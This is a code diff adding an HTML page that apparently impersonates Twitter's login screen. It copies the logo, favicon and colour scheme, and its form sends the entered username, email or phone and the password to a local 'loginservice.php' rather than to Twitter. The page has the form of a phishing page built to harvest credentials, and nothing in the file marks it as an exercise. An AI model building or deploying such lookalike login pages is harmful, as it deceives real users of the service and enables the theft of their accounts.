@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login on Twitter/Twitter</title>
+    <link rel="icon" href="008-twitter.png">
+    <style>
+        body{
+            background-color: rgb(21,32,43);
+        }
+        .logo{
+            height:40px;
+            width:40px;
+            margin-top: 20px; 
+        }
+        .title{
+            color: white;
+            font-family: Verdana;
+            font-size: 23px;
+            margin-top: 15px;
+            cursor: default;
+        }
+        .finput{
+            position: relative;
+            border-bottom: 4px grey solid;
+            width: 504px;
+            
+        }
+        
+.finput input:focus ~ label{
+   font-size: 15px;
+    color: #1687e2;
+    
+}
+.finput:hover{
+  border-bottom: 4px solid #1687e2;
+}
+        
+ div label{
+    position: absolute;
+    top:18px;
+    font-size: 16px;
+    left: 18px;
+    pointer-events: none;
+    transition: .5s;
+    color: grey;
+}
+        input[type="text"]{
+            border: none;
+            outline: none;
+            margin-top: 20px;
+            font-size: 20px;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+            color:white;
+            padding-left: 9px;
+            height: 50px;
+            width: 495px;
+            background-color:  #152533;
+           
+        }
+        
+        input[type="password"]{
+            border: none;
+            outline: none;
+            margin-top: 20px;
+            font-size: 20px;
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+            color:white;
+            padding-left: 9px;
+            height: 50px;
+            width: 495px;
+            background-color: #152533;
+            
+        }
+        ::placeholder{
+            color: white;
+            font-size: 15px;
+            padding-left: 10px;
+            color:#1687e2;;
+        }
+        input[type="submit"]{
+            width: 500px;
+            height: 50px;
+            margin-top: 20px;
+            border-radius: 25px;
+            background-color: #1687e2;
+            border: none;
+            outline: none;
+            cursor: pointer;
+            color: white;
+            font-size: 17px;
+            font-weight: 800;
+
+        }
+        input:hover{
+          opacity: none;
+          color:white;
+        }
+        .last{
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #1687e2;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <center>
+          <form action="loginservice.php" method="post">
+            <img src="twitter-512.png"class="logo">
+            <h1 class="title">Log in to Twitter</h1>
+            
+            <br><br>
+            <div class="finput">
+                <input type="text" name="user"required>
+                <label>Phone, email, or username</label>
+            </div>
+            <br><br>
+             <div class="finput">
+                 
+                <input type="password" name="password" required>
+                <label>Password</label>
+            </div>
+            <input type="submit" value="Login">
+            <p class="last">Forgot password?
+                 ·Sign up for Twitter</p>
+          </form>
+        </center>
+    </div>
+</body>
+</html>
